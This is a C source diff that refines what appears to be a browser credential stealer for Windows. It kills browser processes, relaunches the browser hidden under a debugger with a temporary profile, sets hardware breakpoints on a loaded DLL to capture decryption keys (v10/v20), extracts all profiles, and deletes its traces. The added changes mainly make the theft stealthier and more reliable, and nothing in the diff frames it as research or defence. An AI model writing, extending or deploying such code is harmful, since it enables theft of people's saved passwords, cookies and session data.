@@ -202,12 +202,17 @@ static void kill_process(const char* name) {
     if (Process32First(hSnap, &pe)) {
         do {
             if (_stricmp(pe.szExeFile, name) == 0) {
-                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
+                HANDLE hProc = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pe.th32ProcessID);
+                if (hProc) {
+                    TerminateProcess(hProc, 0);
+                    WaitForSingleObject(hProc, 5000);
+                    CloseHandle(hProc);
+                }
             }
         } while (Process32Next(hSnap, &pe));
     }
     CloseHandle(hSnap);
+    Sleep(500);
 }
 
 static size_t find_target_address(HANDLE hProcess, void* base_addr) {
@@ -715,10 +720,17 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
         return;
     }
 
-    STARTUPINFO si = { sizeof(si) };
+    char tmp_user_data[MAX_PATH];
+    sprintf(tmp_user_data, "%s\\br_data_%u", getenv("TEMP"), GetTickCount());
+    CreateDirectoryA(tmp_user_data, NULL);
+
+    STARTUPINFO si = { 0 };
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
     PROCESS_INFORMATION pi = { 0 };
-    char cmd[MAX_PATH];
-    sprintf(cmd, "\"%s\" --no-first-run --no-default-browser-check", exe_path);
+    char cmd[MAX_PATH * 2];
+    sprintf(cmd, "\"%s\" --no-first-run --no-default-browser-check --user-data-dir=\"%s\"", exe_path, tmp_user_data);
 
     if (!CreateProcess(NULL, cmd, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         char msg[256];
@@ -735,7 +747,9 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
     int success = 0;
 
     while (WaitForDebugEvent(&de, 30000)) {
-        if (de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT) {
+        if (de.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
+            CloseHandle(de.u.CreateProcessInfo.hFile);
+        } else if (de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT) {
             char path[MAX_PATH];
             if (GetFinalPathNameByHandleA(de.u.LoadDll.hFile, path, MAX_PATH, 0)) {
                 if (strstr(path, config->dll_name)) {
@@ -743,6 +757,7 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
                     if (target_addr) set_hw_bp_all_threads(de.dwProcessId, target_addr);
                 }
             }
+            CloseHandle(de.u.LoadDll.hFile);
         } else if (de.dwDebugEventCode == CREATE_THREAD_DEBUG_EVENT) {
             if (target_addr) set_hw_bp(de.dwThreadId, target_addr);
         } else if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
@@ -789,8 +804,10 @@ void collect_browser_data(const char* browser_name, SOCKET sock, HANDLE mutex) {
         if (success) break;
     }
 
+    TerminateProcess(pi.hProcess, 0);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
+    recursive_delete(tmp_user_data);
 
     if (success) {
         extract_all_profiles(user_data, extract_root, v10_key, v20_key, config->temp_prefix, is_opera);
